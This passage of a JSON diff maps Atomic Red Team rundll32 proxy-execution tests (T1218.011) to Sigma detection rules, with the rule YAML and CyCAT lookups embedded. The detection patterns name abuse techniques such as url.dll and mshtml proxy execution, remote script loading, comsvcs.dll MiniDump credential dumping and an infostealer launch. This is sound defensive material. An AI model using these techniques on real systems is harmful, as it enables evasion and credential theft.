 - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Calculator Usage",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_calc_uncommon_exec.yml",
+                        "remote_content": "title: Suspicious Calculator Usage\nid: 737e618a-a410-49b5-bec3-9e55ff7fbc15\nstatus: test\ndescription: |\n    Detects suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion.\nreferences:\n    - https://twitter.com/ItsReallyNick/status/1094080242686312448\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-02-09\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains: '\\calc.exe '\n    selection_2:\n        Image|endswith: '\\calc.exe'\n    filter_main_known_locations:\n        Image|contains:\n            - ':\\Windows\\System32\\'\n            - ':\\Windows\\SysWOW64\\'\n            - ':\\Windows\\WinSxS\\'\n    condition: selection_1 or ( selection_2 and not filter_main_known_locations )\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "9f5d081a-ee5a-42f9-a04e-b7bdc487e676",
+                "atomic_attack_name": "Launches an executable using Rundll32 and pcwutl.dll",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Code Execution via Pcwutl.dll",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_pcwutl.yml",
+                        "remote_content": "title: Code Execution via Pcwutl.dll\nid: 9386d78a-7207-4048-9c9f-a93a7c2d1c05\nstatus: test\ndescription: Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/\n    - https://twitter.com/harr0ey/status/989617817849876488\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-05\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'pcwutl'\n            - 'LaunchApplication'\n    condition: all of selection_*\nfalsepositives:\n    - Use of Program Compatibility Troubleshooter Helper\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "22cfde89-befe-4e15-9753-47306b37a6e3",
+                "atomic_attack_name": "Execution of HTA and VBS Files using Rundll32 and URL.dll",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "638730e7-7aed-43dc-bf8c-8117f805f5bb",
+                "atomic_attack_name": "Rundll32 execute VBscript command",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Wscript Shell Run In CommandLine",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_inline_vbscript.yml",
+                        "remote_content": "title: Wscript Shell Run In CommandLine\nid: 2c28c248-7f50-417a-9186-a85b223010ee\nstatus: test\ndescription: Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity\nreferences:\n    - https://web.archive.org/web/20220830122045/http://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html\n    - https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-31\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Wscript.'\n            - '.Shell'\n            - '.Run'\n    condition: selection\nfalsepositives:\n    - Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Mshtml.DLL RunHTMLApplication Suspicious Usage",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_mshtml_runhtmlapplication.yml",
+                        "remote_content": "title: Mshtml.DLL RunHTMLApplication Suspicious Usage\nid: 4782eb5a-a513-4523-a0ac-f3082b26ac5c\nrelated:\n    - id: 9f06447a-a33a-4cbe-a94f-a3f43184a7a3\n      type: obsolete\n    - id: 73fcad2e-ff14-4c38-b11d-4172c8ac86c7\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of commands that leverage the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, http...)\nreferences:\n    - https://twitter.com/n1nj4sec/status/1421190238081277959\n    - https://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_TROJAN.WIN32.POWESSERE.G_MITIGATION_BYPASS_PART2.txt\n    - http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt\nauthor: Nasreddine Bencherchali (Nextron Systems),  Florian Roth (Nextron Systems), Josh Nickels, frack113, Zaw Min Htun (ZETA)\ndate: 2022-08-14\nmodified: 2024-02-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\..\\'\n            - 'mshtml'\n        CommandLine|contains:\n            - '#135'\n            - 'RunHTMLApplication'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Rundll32 Execution With Uncommon DLL Extension",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml",
+                        "remote_content": "title: Rundll32 Execution With Uncommon DLL Extension\nid: c3a99af4-35a9-4668-879e-c09aeb4f2bdf\nstatus: test\ndescription: Detects the execution of rundll32 with a command line that doesn't contain a common extension\nreferences:\n    - https://twitter.com/mrd0x/status/1481630810495139841?s=12\nauthor: Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou\ndate: 2022-01-13\nmodified: 2024-04-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    filter_main_null:\n        CommandLine: null\n    filter_main_empty:\n        CommandLine: ''\n    filter_main_known_extension:\n        - CommandLine|contains:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl '\n              - '.cpl,'\n              - '.cpl\"'\n              - \".cpl'\"\n              - '.dll '\n              - '.dll,'\n              - '.dll\"'\n              - \".dll'\"\n              - '.inf '\n              - '.inf,'\n              - '.inf\"'\n              - \".inf'\"\n        - CommandLine|endswith:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl'\n              - '.dll'\n              - '.inf'\n    filter_main_localserver:\n        CommandLine|contains: ' -localserver '\n    filter_main_zzzzInvokeManagedCustomActionOutOfProc:\n        ParentImage|endswith: '\\msiexec.exe'\n        CommandLine|contains|all:\n            - ':\\Windows\\Installer\\'\n            - '.tmp'\n            - 'zzzzInvokeManagedCustomActionOutOfProc'\n    filter_optional_EdgeUpdate:\n        ParentCommandLine|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{'\n            - '\\EDGEMITMP_'\n            - '.tmp\\setup.exe'\n            - '--install-archive='\n            - '--previous-version='\n            - '--msedgewebview --verbose-logging --do-not-launch-msedge --user-level'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "57ba4ce9-ee7a-4f27-9928-3c70c489b59d",
+                "atomic_attack_name": "Rundll32 execute JavaScript Remote Payload With GetObject",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Mshtml.DLL RunHTMLApplication Suspicious Usage",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_mshtml_runhtmlapplication.yml",
+                        "remote_content": "title: Mshtml.DLL RunHTMLApplication Suspicious Usage\nid: 4782eb5a-a513-4523-a0ac-f3082b26ac5c\nrelated:\n    - id: 9f06447a-a33a-4cbe-a94f-a3f43184a7a3\n      type: obsolete\n    - id: 73fcad2e-ff14-4c38-b11d-4172c8ac86c7\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of commands that leverage the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, http...)\nreferences:\n    - https://twitter.com/n1nj4sec/status/1421190238081277959\n    - https://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_TROJAN.WIN32.POWESSERE.G_MITIGATION_BYPASS_PART2.txt\n    - http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt\nauthor: Nasreddine Bencherchali (Nextron Systems),  Florian Roth (Nextron Systems), Josh Nickels, frack113, Zaw Min Htun (ZETA)\ndate: 2022-08-14\nmodified: 2024-02-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\..\\'\n            - 'mshtml'\n        CommandLine|contains:\n            - '#135'\n            - 'RunHTMLApplication'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Rundll32 Execution With Uncommon DLL Extension",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml",
+                        "remote_content": "title: Rundll32 Execution With Uncommon DLL Extension\nid: c3a99af4-35a9-4668-879e-c09aeb4f2bdf\nstatus: test\ndescription: Detects the execution of rundll32 with a command line that doesn't contain a common extension\nreferences:\n    - https://twitter.com/mrd0x/status/1481630810495139841?s=12\nauthor: Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou\ndate: 2022-01-13\nmodified: 2024-04-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    filter_main_null:\n        CommandLine: null\n    filter_main_empty:\n        CommandLine: ''\n    filter_main_known_extension:\n        - CommandLine|contains:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl '\n              - '.cpl,'\n              - '.cpl\"'\n              - \".cpl'\"\n              - '.dll '\n              - '.dll,'\n              - '.dll\"'\n              - \".dll'\"\n              - '.inf '\n              - '.inf,'\n              - '.inf\"'\n              - \".inf'\"\n        - CommandLine|endswith:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl'\n              - '.dll'\n              - '.inf'\n    filter_main_localserver:\n        CommandLine|contains: ' -localserver '\n    filter_main_zzzzInvokeManagedCustomActionOutOfProc:\n        ParentImage|endswith: '\\msiexec.exe'\n        CommandLine|contains|all:\n            - ':\\Windows\\Installer\\'\n            - '.tmp'\n            - 'zzzzInvokeManagedCustomActionOutOfProc'\n    filter_optional_EdgeUpdate:\n        ParentCommandLine|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{'\n            - '\\EDGEMITMP_'\n            - '.tmp\\setup.exe'\n            - '--install-archive='\n            - '--previous-version='\n            - '--msedgewebview --verbose-logging --do-not-launch-msedge --user-level'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "5cdbc2e8-86dd-43df-9a1a-200d4745fba5",
+                    "e593cf51-88db-4ee1-b920-37e89012a3c9",
+                    "caa06de8-fdef-4c91-826a-7f9e163eef4b",
+                    "e79a9e79-eb72-4e78-a628-0e7e8f59e89c",
+                    "5cdb711b-5740-4fb2-ba88-f7945027afac",
+                    "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+                    "b18c9d4c-fac9-4708-bd06-dd5bfacf200f",
+                    "e3e245fa-1e8e-41db-94d3-6991edd0eaee",
+                    "a7c3d773-caef-227e-a7e7-c2f13c622329",
+                    "d465d1d8-27a2-4cca-9621-a800f37cf72e",
+                    "045d0922-2310-4e60-b5e4-3302302cb3c5",
+                    "73fcad2e-ff14-4c38-b11d-4172c8ac86c7",
+                    "3a3f81ca-652c-482b-adeb-b1c804727f74",
+                    "994cac2b-92c2-44bf-8853-14f6ca39fbda",
+                    "cdc8da7d-c303-42f8-b08c-b4ab47230263",
+                    "32b96012-7892-429e-b26c-ac2bf46066ff",
+                    "40b6e656-4e11-4c0c-8772-c1cc6dae34ce",
+                    "95022b85-ff2a-49fa-939a-d7b8f56eeb9b",
+                    "731231b9-0b5d-4219-94dd-abb6959aa7ea",
+                    "f0b70adb-0075-43b0-9745-e82a1c608fcc",
+                    "7453575c-a747-40b9-839b-125a0aae324b",
+                    "6812a10b-60ea-420c-832f-dfcc33b646ba",
+                    "ba778144-5e3d-40cf-8af9-e28fb1df1e20",
+                    "285b85b1-a555-4095-8652-a8a4106af63f",
+                    "d7eb979b-c2b5-4a6f-a3a7-c87ce6763819",
+                    "79aeeb41-8156-4fac-a0cd-076495ab82a1",
+                    "3d4aebe0-6d29-45b2-a8a4-3dfde586a26d",
+                    "54e57ce3-0672-46eb-a402-2c0948d5e3e9",
+                    "ae9c6a7c-9521-42a6-915e-5aaa8689d529",
+                    "09e6d5c0-05b8-4ff8-9eeb-043046ec774c",
+                    "4c0aaedc-154c-4427-ada0-d80ef9c9deb6",
+                    "c048f047-7e2a-4888-b302-55f509d4a91d",
+                    "8acf3cfa-1e8c-4099-83de-a0c4038e18f0",
+                    "9386d78a-7207-4048-9c9f-a93a7c2d1c05",
+                    "15bd98ea-55f4-4d37-b09a-e7caa0fa2221",
+                    "99b97608-3e21-4bfe-8217-2a127c396a0e"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "5cdbc2e8-86dd-43df-9a1a-200d4745fba5",
+                        "lookup_data": {
+                            "description": "Detects the use of Rundll32 to launch an NSIS module that serves as the main stealer capability of Rhadamanthys infostealer, as observed in reports and samples in early 2023",
+                            "raw": "author: TropChaud\ndate: 2023/01/26\ndescription: Detects the use of Rundll32 to launch an NSIS module that serves as the\n  main stealer capability of Rhadamanthys infostealer, as observed in reports and\n  samples in early 2023\ndetection:\n  condition: all of selection_*\n  selection_dll:\n    CommandLine|contains: nsis_uns\n  selection_export_function:\n    CommandLine|contains: PrintUIEntry\n  selection_rundll32:\n  - OriginalFileName: RUNDLL32.EXE\n  - Image|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: 5cdbc2e8-86dd-43df-9a1a-200d4745fba5\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://elis531989.medium.com/dancing-with-shellcodes-analyzing-rhadamanthys-stealer-3c4986966a88\n- https://blog.cyble.com/2023/01/12/rhadamanthys-new-stealer-spreading-through-google-ads/\n- https://www.joesandbox.com/analysis/790122/0/html\n- https://twitter.com/anfam17/status/1607477672057208835\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Rhadamanthys Stealer Module Launch via Rundll32\n",
+                            "sigma:id": "5cdbc2e8-86dd-43df-9a1a-200d4745fba5",
+                            "title": "Rhadamanthys Stealer Module Launch via Rundll32",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e593cf51-88db-4ee1-b920-37e89012a3c9",
+                        "lookup_data": {
+                            "description": "Detects suspicious process related to rundll32 based on arguments",
+                            "raw": "author: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali\ndate: 2019/01/16\ndescription: Detects suspicious process related to rundll32 based on arguments\ndetection:\n  condition: selection and not 1 of filter*\n  filter:\n    CommandLine|contains: shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver\n  filter_parent:\n    ParentCommandLine|contains: .cpl\n    ParentImage: C:\\Windows\\System32\\control.exe\n  filter_startmenu:\n    CommandLine|endswith: .cpl\",\n    CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL\n      \"C:\\Windows\\System32\\'\n    ParentImage: C:\\Windows\\System32\\control.exe\n  selection:\n  - CommandLine|contains|all:\n    - 'javascript:'\n    - .RegisterXLL\n  - CommandLine|contains|all:\n    - url.dll\n    - OpenURL\n  - CommandLine|contains|all:\n    - url.dll\n    - OpenURLA\n  - CommandLine|contains|all:\n    - url.dll\n    - FileProtocolHandler\n  - CommandLine|contains|all:\n    - zipfldr.dll\n    - RouteTheCall\n  - CommandLine|contains|all:\n    - shell32.dll\n    - Control_RunDLL\n  - CommandLine|contains|all:\n    - shell32.dll\n    - ShellExec_RunDLL\n  - CommandLine|contains|all:\n    - mshtml.dll\n    - PrintHTML\n  - CommandLine|contains|all:\n    - advpack.dll\n    - LaunchINFSection\n  - CommandLine|contains|all:\n    - advpack.dll\n    - RegisterOCX\n  - CommandLine|contains|all:\n    - ieadvpack.dll\n    - LaunchINFSection\n  - CommandLine|contains|all:\n    - ieadvpack.dll\n    - RegisterOCX\n  - CommandLine|contains|all:\n    - ieframe.dll\n    - OpenURL\n  - CommandLine|contains|all:\n    - shdocvw.dll\n    - OpenURL\n  - CommandLine|contains|all:\n    - syssetup.dll\n    - SetupInfObjectInstallAction\n  - CommandLine|contains|all:\n    - setupapi.dll\n    - InstallHinfSection\n  - CommandLine|contains|all:\n    - pcwutl.dll\n    - LaunchApplication\n  - CommandLine|contains|all:\n    - dfshim.dll\n    - ShOpenVerbApplication\n  - CommandLine|contains|all:\n    - dfshim.dll\n    - ShOpenVerbShortcut\n  - CommandLine|contains|all:\n    - scrobj.dll\n    - GenerateTypeLib\n    - http\n  - CommandLine|contains|all:\n    - shimgvw.dll\n    - ImageView_Fullscreen\n    - http\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/22\nreferences:\n- http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n- https://twitter.com/Hexacorn/status/885258886428725250\n- https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n- https://twitter.com/nas_bench/status/1433344116071583746\n- https://twitter.com/eral4m/status/1479106975967240209\n- https://twitter.com/eral4m/status/1479080793003671557\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Suspicious Rundll32 Activity\n",
+                            "sigma:id": "e593cf51-88db-4ee1-b920-37e89012a3c9",
+                            "title": "Suspicious Rundll32 Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "caa06de8-fdef-4c91-826a-7f9e163eef4b",
+                        "lookup_data": {
+                            "description": "Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way",
+                            "raw": "author: elhoim, CD_ROM_\ndate: 2022/04/27\ndescription: Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon,\n  often observes Gamarue spawning the explorer.exe process in an unusual way\ndetection:\n  condition: selection and not filter\n  filter:\n    ParentCommandLine|contains: \\shell32.dll,Control_RunDLL\n  selection:\n    Image|endswith: \\explorer.exe\n    ParentImage|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: caa06de8-fdef-4c91-826a-7f9e163eef4b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/25\nreferences:\n- https://redcanary.com/blog/intelligence-insights-november-2021/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: RunDLL32 Spawning Explorer\n",
+                            "sigma:id": "caa06de8-fdef-4c91-826a-7f9e163eef4b",
+                            "title": "RunDLL32 Spawning Explorer",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e79a9e79-eb72-4e78-a628-0e7e8f59e89c",
+                        "lookup_data": {
+                            "description": "Detects suspicious calls of DLLs in rundll32.dll exports by ordinal",
